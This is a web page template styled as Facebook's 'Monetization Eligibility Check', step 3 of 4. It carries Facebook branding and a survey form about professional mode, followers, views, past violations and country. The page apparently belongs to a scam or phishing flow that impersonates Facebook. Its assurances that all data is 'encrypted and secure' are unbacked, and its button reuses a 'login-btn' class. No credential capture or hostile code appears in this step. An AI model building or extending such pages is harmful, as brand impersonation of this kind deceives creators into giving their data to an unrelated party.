{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:540px;margin:20px auto;box-shadow:0 8px 32px rgba(24,119,242,0.12);border-radius:20px;border:1px solid rgba(24,119,242,0.1);">
  <div class="platform-header">
    <div class="icon-circle bg-facebook">
      <i class="fa-brands fa-facebook icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
      <div style="color:#64748b;font-size:13px;margin-top:2px">Monetization Eligibility Check</div>
    </div>
  </div>

  <!-- Progress Indicator -->
  <div class="progress-container" style="margin:20px 0 24px 0;">
    <div class="progress-bar" style="height:6px;background:#f1f5f9;border-radius:10px;overflow:hidden;">
      <div class="progress-fill" style="height:100%;background:linear-gradient(90deg, #1877F2, #42A5F5);width:75%;border-radius:10px;"></div>
    </div>
    <div style="display:flex;justify-content:space-between;margin-top:8px;">
      <span style="color:#1877F2;font-size:12px;font-weight:600">Step 3 of 4</span>
      <span style="color:#64748b;font-size:12px;font-weight:500">75% Complete</span>
    </div>
  </div>

  <div class="play-instructions" style="margin:16px 0 24px 0;">
    <div class="instruction-card" style="background:linear-gradient(135deg, #f8fafc, #ffffff);border:1px solid rgba(24,119,242,0.1);">
      <div class="message-header">
        <div class="meta-logo" style="background:linear-gradient(135deg, #1877F2, #42A5F5);box-shadow:0 4px 12px rgba(24,119,242,0.2);">
          <i class="fa-solid fa-clipboard-check" style="margin-right:6px;"></i>
          Assessment
        </div>
        <div class="message-date" style="color:#1877F2;font-weight:600">Required</div>
      </div>
      
      <div class="facebook-message">
        <p class="message-text" style="color:#374151;font-weight:500">Complete this eligibility assessment to determine your monetization qualification status.</p>
        
        <div class="feature-list" style="margin:16px 0;">
          <div class="feature-item" style="display:flex;align-items:center;margin-bottom:8px;">
            <i class="fa-solid fa-check" style="color:#10B981;margin-right:8px;font-size:12px;"></i>
            <span style="color:#475569;font-size:13px;">Account status evaluation</span>
          </div>
          <div class="feature-item" style="display:flex;align-items:center;margin-bottom:8px;">
            <i class="fa-solid fa-check" style="color:#10B981;margin-right:8px;font-size:12px;"></i>
            <span style="color:#475569;font-size:13px;">Content quality analysis</span>
          </div>
          <div class="feature-item" style="display:flex;align-items:center;">
            <i class="fa-solid fa-check" style="color:#10B981;margin-right:8px;font-size:12px;"></i>
            <span style="color:#475569;font-size:13px;">Performance metrics review</span>
          </div>
        </div>
        
        <div class="security-notice" style="background:rgba(24,119,242,0.05);border:1px solid rgba(24,119,242,0.2);border-radius:10px;">
          <p class="security-text" style="color:#1877F2;font-weight:600;display:flex;align-items:center;">
            <i class="fa-solid fa-shield-check" style="margin-right:8px;"></i>
            All information is encrypted and secure
          </p>
        </div>
      </div>
    </div>
  </div>

  <form id="eligibilityForm" method="POST" novalidate>
    <!-- SECTION 1 — Account Status -->
    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(24,119,242,0.1);margin-bottom:24px;">
      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
        <div class="section-icon" style="background:linear-gradient(135deg, #1877F2, #42A5F5);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
          <i class="fa-solid fa-user-check" style="font-size:14px;"></i>
        </div>
        <div>
          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Account Status</h3>
          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Verify your account configuration</p>
        </div>
      </div>
      
      <div class="question-group">
        <label class="question-label">
          <span class="question-number">1</span>
          Is your profile/page in Professional Mode?
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="professional_mode" value="yes" required> 
            <span class="radio-content">
              <span class="radio-title">Yes</span>
              <span class="radio-description">My account is in Professional Mode</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="professional_mode" value="no"> 
            <span class="radio-content">
              <span class="radio-title">No</span>
              <span class="radio-description">Personal or standard account</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="professional_mode" value="not_sure"> 
            <span class="radio-content">
              <span class="radio-title">Not sure</span>
              <span class="radio-description">Unsure of current account mode</span>
            </span>
          </label>
        </div>
      </div>

      <div class="question-group">
        <label class="question-label">
          <span class="question-number">2</span>
          How many followers do you have?
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="followers" value="0-1000" required> 
            <span class="radio-content">
              <span class="radio-title">0–1,000</span>
              <span class="radio-description">Building audience</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="followers" value="1000-5000"> 
            <span class="radio-content">
              <span class="radio-title">1,000–5,000</span>
              <span class="radio-description">Growing community</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="followers" value="5000-10000"> 
            <span class="radio-content">
              <span class="radio-title">5,000–10,000</span>
              <span class="radio-description">Established presence</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="followers" value="10000+"> 
            <span class="radio-content">
              <span class="radio-title">10,000+</span>
              <span class="radio-description">Significant following</span>
            </span>
          </label>
        </div>
      </div>

      <div class="question-group">
        <label class="question-label">
          <span class="question-number">3</span>
          Have you posted videos in the last 30 days?
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="videos_30_days" value="yes" required> 
            <span class="radio-content">
              <span class="radio-title">Yes</span>
              <span class="radio-description">Active video content creator</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="videos_30_days" value="no"> 
            <span class="radio-content">
              <span class="radio-title">No</span>
              <span class="radio-description">No recent video uploads</span>
            </span>
          </label>
        </div>
      </div>
    </div>

    <!-- SECTION 2 — Content Quality -->
    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(24,119,242,0.1);margin-bottom:24px;">
      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
        <div class="section-icon" style="background:linear-gradient(135deg, #10B981, #34D399);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
          <i class="fa-solid fa-star" style="font-size:14px;"></i>
        </div>
        <div>
          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Content Quality</h3>
          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Evaluate your content standards</p>
        </div>
      </div>
      
      <div class="question-group">
        <label class="question-label">
          <span class="question-number">4</span>
          Is your content 100% original?
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="original_content" value="yes" required> 
            <span class="radio-content">
              <span class="radio-title">Yes</span>
              <span class="radio-description">All content is completely original</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="original_content" value="no"> 
            <span class="radio-content">
              <span class="radio-title">No</span>
              <span class="radio-description">Includes repurposed content</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="original_content" value="sometimes"> 
            <span class="radio-content">
              <span class="radio-title">Sometimes</span>
              <span class="radio-description">Mix of original and other content</span>
            </span>
          </label>
        </div>
      </div>

      <div class="question-group">
        <label class="question-label">
          <span class="question-number">5</span>
          Do you use copyrighted music in your videos?
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="copyrighted_music" value="yes" required> 
            <span class="radio-content">
              <span class="radio-title">Yes</span>
              <span class="radio-description">Use licensed or copyrighted audio</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="copyrighted_music" value="no"> 
            <span class="radio-content">
              <span class="radio-title">No</span>
              <span class="radio-description">Only royalty-free or original audio</span>
            </span>
          </label>
        </div>
      </div>

      <div class="question-group">
        <label class="question-label">
          <span class="question-number">6</span>
          Does your content include violence, sexual content, or graphic scenes?
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="sensitive_content" value="yes" required> 
            <span class="radio-content">
              <span class="radio-title">Yes</span>
              <span class="radio-description">Contains restricted content</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="sensitive_content" value="no"> 
            <span class="radio-content">
              <span class="radio-title">No</span>
              <span class="radio-description">Family-friendly content only</span>
            </span>
          </label>
        </div>
      </div>
    </div>

    <!-- SECTION 3 — Performance Metrics -->
    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(24,119,242,0.1);margin-bottom:24px;">
      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
        <div class="section-icon" style="background:linear-gradient(135deg, #F59E0B, #FBBF24);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
          <i class="fa-solid fa-chart-line" style="font-size:14px;"></i>
        </div>
        <div>
          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Performance Metrics</h3>
          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Review your engagement statistics</p>
        </div>
      </div>
      
      <div class="question-group">
        <label class="question-label">
          <span class="question-number">7</span>
          Average monthly video views:
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="monthly_views" value="0-10k" required> 
            <span class="radio-content">
              <span class="radio-title">0–10k</span>
              <span class="radio-description">Early growth stage</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="monthly_views" value="10k-50k"> 
            <span class="radio-content">
              <span class="radio-title">10k–50k</span>
              <span class="radio-description">Consistent viewership</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="monthly_views" value="50k-100k"> 
            <span class="radio-content">
              <span class="radio-title">50k–100k</span>
              <span class="radio-description">Strong performance</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="monthly_views" value="100k+"> 
            <span class="radio-content">
              <span class="radio-title">100k+</span>
              <span class="radio-description">High traffic volume</span>
            </span>
          </label>
        </div>
      </div>

      <div class="question-group">
        <label class="question-label">
          <span class="question-number">8</span>
          Have you ever had a monetization violation?
        </label>
        <div class="radio-group">
          <label class="radio-label premium"><input type="radio" name="monetization_violation" value="yes" required> 
            <span class="radio-content">
              <span class="radio-title">Yes</span>
              <span class="radio-description">Previous policy violations</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="monetization_violation" value="no"> 
            <span class="radio-content">
              <span class="radio-title">No</span>
              <span class="radio-description">Clean compliance record</span>
            </span>
          </label>
          <label class="radio-label premium"><input type="radio" name="monetization_violation" value="not_sure"> 
            <span class="radio-content">
              <span class="radio-title">Not sure</span>
              <span class="radio-description">Uncertain about past issues</span>
            </span>
          </label>
        </div>
      </div>
    </div>

    <!-- SECTION 4 — Region -->
    <div class="form-section" style="background:#ffffff;padding:20px;border-radius:16px;border:1px solid rgba(24,119,242,0.1);margin-bottom:24px;">
      <div class="section-header" style="display:flex;align-items:center;margin-bottom:20px;">
        <div class="section-icon" style="background:linear-gradient(135deg, #8B5CF6, #A78BFA);color:white;width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin-right:12px;">
          <i class="fa-solid fa-globe" style="font-size:14px;"></i>
        </div>
        <div>
          <h3 style="color:#1e293b;margin:0 0 4px 0;font-size:17px;font-weight:700;">Region & Location</h3>
          <p style="color:#64748b;margin:0;font-size:13px;font-weight:500">Select your primary location</p>
        </div>
      </div>
      
      <div class="question-group">
        <label class="question-label">
          <span class="question-number">9</span>
          Your region (country)
        </label>
        <div class="country-input-container" style="position:relative;">
          <i class="fa-solid fa-magnifying-glass" style="position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#64748b;z-index:2;"></i>
          <!-- CHANGED: Added custom dropdown for countries -->
          <input type="text" class="input premium-input" id="countryInput" name="country" placeholder="Click to select your country..." required readonly style="padding-left:44px;font-size:15px;cursor:pointer;">
          <div class="country-dropdown" id="countryDropdown" style="display:none;position:absolute;top:100%;left:0;right:0;background:white;border:1.5px solid #e5e7eb;border-radius:14px;box-shadow:0 8px 25px rgba(0,0,0,0.15);max-height:300px;overflow-y:auto;z-index:1000;margin-top:4px;">
            <div class="country-search-container" style="padding:12px;border-bottom:1px solid #f1f5f9;position:sticky;top:0;background:white;z-index:1001;">
              <input type="text" id="countrySearch" placeholder="Search countries..." style="width:100%;padding:10px 12px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;outline:none;">
            </div>
            <div class="country-list" id="countryList" style="max-height:250px;overflow-y:auto;">
              <!-- Countries will be populated by JavaScript -->
            </div>
          </div>
        </div>
        <div class="input-help" style="color:#64748b;font-size:12px;margin-top:6px;display:flex;align-items:center;">
          <i class="fa-solid fa-info-circle" style="margin-right:6px;"></i>
          Select your primary country for monetization eligibility
        </div>
      </div>
    </div>

    <div class="center" style="padding:8px 0 20px 0;">
      <button class="btn login-btn premium-btn" type="submit">
        <span class="btn-content">
          <span class="btn-text">Complete Assessment</span>
          <i class="fa-solid fa-arrow-right" style="margin-left:8px;"></i>
        </span>
      </button>
      <div class="btn-help" style="color:#64748b;font-size:12px;margin-top:12px;display:flex;align-items:center;justify-content:center;">
        <i class="fa-solid fa-lock" style="margin-right:6px;"></i>
        Secure form submission • All data is encrypted
      </div>
    </div>
  </form>
</div>

<style>
/* Premium Input Styles */
.input.premium-input {
  width: 100%;
  padding: 16px 16px 16px 44px;
  border-radius: 14px;
  border: 1.5px solid #e5e7eb;
  margin-bottom: 6px;
  font-size: 15px;
  font-weight: 500;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  background: #fafafa;
  box-shadow: 0 2px 4px rgba(0,0,0,0.02);
}
.input.premium-input:focus {
  border-color: #1877F2;
  box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15), 0 4px 12px rgba(0,0,0,0.05);
  outline: none;
  background: #ffffff;
  transform: translateY(-1px);
}

/* Country dropdown specific styles */
.country-dropdown {
  animation: dropdownFade 0.2s ease-out;
}

@keyframes dropdownFade {
  from { opacity: 0; transform: translateY(-10px); }
  to { opacity: 1; transform: translateY(0); }
}

.country-item {
  padding: 12px 16px;
  cursor: pointer;
  border-bottom: 1px solid #f8fafc;
  font-size: 14px;
  color: #374151;
  transition: all 0.2s ease;
}

.country-item:hover {
  background: rgba(24, 119, 242, 0.05);
  color: #1877F2;
}

.country-item:last-child {
  border-bottom: none;
}

.country-item.highlighted {
  background: rgba(24, 119, 242, 0.1);
  color: #1877F2;
  font-weight: 600;
}

/* Error states for validation */
.question-group.error {
  border-left: 4px solid #ef4444;
  padding-left: 12px;
  margin-left: -12px;
  animation: shake 0.5s ease-in-out;
}

.form-section.error {
  border-color: #ef4444;
  box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.1);
}

.input-error {
  border-color: #ef4444 !important;
  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1) !important;
}

/* Premium Question Labels */
.question-label {
  display: block;
  font-weight: 600;
  color: #1e293b;
  margin-bottom: 12px;
  font-size: 15px;
  line-height: 1.5;
}

.question-number {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 24px;
  height: 24px;
  background: linear-gradient(135deg, #1877F2, #42A5F5);
  color: white;
  border-radius: 8px;
  font-size: 12px;
  font-weight: 700;
  margin-right: 10px;
}

/* Premium Radio Buttons */
.radio-group {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.radio-label.premium {
  display: flex;
  align-items: center;
  padding: 16px;
  border: 1.5px solid #e5e7eb;
  border-radius: 14px;
  background: #fafafa;
  cursor: pointer;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  font-size: 14px;
  position: relative;
  overflow: hidden;
}

.radio-label.premium::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(24, 119, 242, 0.05), transparent);
  transition: left 0.6s;
}

.radio-label.premium:hover::before {
  left: 100%;
}

.radio-label.premium:hover {
  background: #f8fafc;
  border-color: #1877F2;
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0,0,0,0.08);
}

.radio-label.premium input[type="radio"] {
  margin-right: 12px;
  width: 18px;
  height: 18px;
  accent-color: #1877F2;
}

.radio-content {
  display: flex;
  flex-direction: column;
  flex: 1;
}

.radio-title {
  color: #1e293b;
  font-weight: 600;
  font-size: 14px;
  margin-bottom: 2px;
}

.radio-description {
  color: #64748b;
  font-size: 12px;
  font-weight: 500;
}

/* Premium Button */
.login-btn.premium-btn {
  width: 100%;
  background: linear-gradient(135deg, #1877F2, #42A5F5);
  color: #fff;
  font-size: 16px;
  font-weight: 700;
  padding: 18px 24px;
  border-radius: 16px;
  cursor: pointer;
  border: none;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  box-shadow: 0 8px 20px rgba(24,119,242,0.3);
  display: block;
  margin-top: 8px;
  position: relative;
  overflow: hidden;
}

.login-btn.premium-btn::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
  transition: left 0.6s;
}

.login-btn.premium-btn:hover::before {
  left: 100%;
}

.login-btn.premium-btn:hover {
  background: linear-gradient(135deg, #166fe5, #3b99f0);
  box-shadow: 0 12px 28px rgba(24,119,242,0.4);
  transform: translateY(-2px);
}

.login-btn.premium-btn:active {
  transform: translateY(0);
  box-shadow: 0 6px 16px rgba(24,119,242,0.3);
}

.btn-content {
  display: flex;
  align-items: center;
  justify-content: center;
}

.btn-text {
  font-weight: 700;
  letter-spacing: 0.5px;
}

/* Enhanced existing styles with premium touches */
.play-instructions {
  margin: 16px 0;
}

.instruction-card {
  background: #ffffff;
  padding: 20px;
  border-radius: 16px;
  border: 1px solid #e5e7eb;
  margin-bottom: 12px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.05);
}

.message-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
  padding-bottom: 12px;
  border-bottom: 1px solid #f1f5f9;
}

.meta-logo {
  background: linear-gradient(135deg, #1877F2, #42A5F5);
  color: white;
  font-weight: 700;
  font-size: 13px;
  padding: 8px 12px;
  border-radius: 10px;
  letter-spacing: 0.3px;
  display: flex;
  align-items: center;
}

.facebook-message {
  line-height: 1.5;
}

.message-text {
  color: #475569;
  margin: 0 0 12px 0;
  line-height: 1.5;
  font-size: 14px;
}

.security-notice {
  background: rgba(24,119,242,0.05);
  border: 1px solid rgba(24,119,242,0.2);
  border-radius: 10px;
  padding: 12px 16px;
  margin: 16px 0;
}

.security-text {
  color: #1877F2;
  margin: 0;
  line-height: 1.4;
  font-size: 13px;
  font-weight: 600;
}

.center {
  text-align: center;
}

/* Country search styling */
.country-input-container {
  position: relative;
}

.country-input-container input {
  padding-right: 16px;
}

/* Responsive improvements */
@media (max-width: 480px) {
  .card {
    margin: 12px auto;
    border-radius: 16px;
  }
  
  .radio-label.premium {
    padding: 14px;
  }
  
  .login-btn.premium-btn {
    padding: 16px 20px;
  }
  
  .country-dropdown {
    position: fixed;
    top: 50% !important;
    left: 20px !important;
    right: 20px !important;
    transform: translateY(-50%);
    max-height: 70vh;
  }
}
</style>

<script>
// Complete list of all countries in the world
const countries = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", 
  "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", 
  "Belize", "Benin", "Bhutan", "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", 
  "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", "Cameroon", "Canada", "Central African Republic", "Chad", 
  "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czech Republic", 
  "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", 
  "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", "Gambia", "Georgia", 
  "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras", 
  "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", 
  "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kosovo", "Kuwait", "Kyrgyzstan", 
  "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", 
  "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", 
  "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", 
  "Namibia", "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", 
  "Norway", "Oman", "Pakistan", "Palau", "Palestine", "Panama", "Papua New Guinea", "Paraguay", "Peru", 
  "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", 
  "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", 
  "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", 
  "South Africa", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", 
  "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", 
  "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", 
  "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"
];

document.addEventListener('DOMContentLoaded', function() {
  const countryInput = document.getElementById('countryInput');
  const countryDropdown = document.getElementById('countryDropdown');
  const countrySearch = document.getElementById('countrySearch');
  const countryList = document.getElementById('countryList');
  
  // Populate country list
  function populateCountryList(filter = '') {
    countryList.innerHTML = '';
    const filteredCountries = countries.filter(country => 
      country.toLowerCase().includes(filter.toLowerCase())
    );
    
    filteredCountries.forEach(country => {
      const countryItem = document.createElement('div');
      countryItem.className = 'country-item';
      countryItem.textContent = country;
      countryItem.addEventListener('click', function() {
        countryInput.value = country;
        countryDropdown.style.display = 'none';
        countryInput.classList.remove('input-error');
        // Remove error class from parent question group
        const questionGroup = countryInput.closest('.question-group');
        if (questionGroup) {
          questionGroup.classList.remove('error');
        }
      });
      countryList.appendChild(countryItem);
    });
    
    if (filteredCountries.length === 0) {
      const noResults = document.createElement('div');
      noResults.className = 'country-item';
      noResults.textContent = 'No countries found';
      noResults.style.color = '#64748b';
      noResults.style.fontStyle = 'italic';
      countryList.appendChild(noResults);
    }
  }
  
  // Initialize country list
  populateCountryList();
  
  // Toggle dropdown when clicking the input
  countryInput.addEventListener('click', function(e) {
    e.stopPropagation();
    countryDropdown.style.display = countryDropdown.style.display === 'none' ? 'block' : 'none';
    if (countryDropdown.style.display === 'block') {
      countrySearch.focus();
    }
  });
  
  // Filter countries when typing in search
  countrySearch.addEventListener('input', function() {
    populateCountryList(this.value);
  });
  
  // Close dropdown when clicking outside
  document.addEventListener('click', function() {
    countryDropdown.style.display = 'none';
  });
  
  // Prevent dropdown from closing when clicking inside it
  countryDropdown.addEventListener('click', function(e) {
    e.stopPropagation();
  });
  
  // Enhanced form validation with scroll to error
  document.getElementById("eligibilityForm").addEventListener("submit", function(event) {
    let valid = true;
    let firstErrorElement = null;

    // Remove previous error states
    document.querySelectorAll('.question-group.error, .form-section.error, .input-error').forEach(el => {
      el.classList.remove('error', 'input-error');
    });

    // Check all required radio groups
    const radioGroups = document.querySelectorAll('input[type="radio"][required]');
    const groupNames = new Set();
    
    radioGroups.forEach(radio => groupNames.add(radio.name));
    
    groupNames.forEach(groupName => {
      const groupChecked = document.querySelector(`input[name="${groupName}"]:checked`);
      if (!groupChecked) {
        valid = false;
        const questionGroup = document.querySelector(`input[name="${groupName}"]`).closest('.question-group');
        const formSection = questionGroup.closest('.form-section');
        
        questionGroup.classList.add('error');
        formSection.classList.add('error');
        
        if (!firstErrorElement) {
          firstErrorElement = questionGroup;
        }
      }
    });

    // Check country selection
    if (!countryInput.value) {
      valid = false;
      countryInput.classList.add("input-error");
      const questionGroup = countryInput.closest('.question-group');
      const formSection = questionGroup.closest('.form-section');
      
      questionGroup.classList.add('error');
      formSection.classList.add('error');
      
      if (!firstErrorElement) {
        firstErrorElement = questionGroup;
      }
    }

    if (!valid) {
      event.preventDefault();
      
      // Scroll to first error with smooth animation
      if (firstErrorElement) {
        firstErrorElement.scrollIntoView({ 
          behavior: 'smooth', 
          block: 'center'
        });
        
        // Add highlight effect
        firstErrorElement.style.animation = 'none';
        setTimeout(() => {
          firstErrorElement.style.animation = 'shake 0.5s ease-in-out';
        }, 10);
      }
      
      // Enhanced error notification
      const errorNotification = document.createElement('div');
      errorNotification.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: #ef4444;
        color: white;
        padding: 12px 20px;
        border-radius: 12px;
        font-weight: 600;
        box-shadow: 0 8px 20px rgba(239,68,68,0.3);
        z-index: 1000;
        display: flex;
        align-items: center;
        gap: 8px;
      `;
      errorNotification.innerHTML = `
        <i class="fa-solid fa-exclamation-circle"></i>
        Please complete all required fields
      `;
      document.body.appendChild(errorNotification);
      setTimeout(() => errorNotification.remove(), 3000);
    } else {
      // Add loading state to button
      const button = this.querySelector('.login-btn');
      const originalContent = button.innerHTML;
      button.innerHTML = `
        <div class="btn-content">
          <i class="fa-solid fa-spinner fa-spin" style="margin-right:8px;"></i>
          <span class="btn-text">Processing Assessment...</span>
        </div>
      `;
      button.disabled = true;
    }
  });

  // Remove error state when country is selected or radio is chosen
  document.querySelectorAll('input[type="radio"]').forEach(radio => {
    radio.addEventListener('change', function() {
      const questionGroup = this.closest('.question-group');
      const formSection = questionGroup.closest('.form-section');
      questionGroup.classList.remove('error');
      formSection.classList.remove('error');
    });
  });

  // Add shake animation for errors
  const style = document.createElement('style');
  style.textContent = `
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      75% { transform: translateX(5px); }
    }
  `;
  document.head.appendChild(style);

  // Enhanced radio button interactions
  document.querySelectorAll('.radio-label.premium input[type="radio"]').forEach(radio => {
    radio.addEventListener('change', function() {
      // Remove selected state from all in group
      const groupName = this.name;
      document.querySelectorAll(`input[name="${groupName}"]`).forEach(otherRadio => {
        otherRadio.closest('.radio-label.premium').style.background = '#fafafa';
        otherRadio.closest('.radio-label.premium').style.borderColor = '#e5e7eb';
      });
      
      // Add selected state to current
      if (this.checked) {
        this.closest('.radio-label.premium').style.background = 'rgba(24, 119, 242, 0.05)';
        this.closest('.radio-label.premium').style.borderColor = '#1877F2';
      }
    });
  });
});
</script>
{% endblock %}
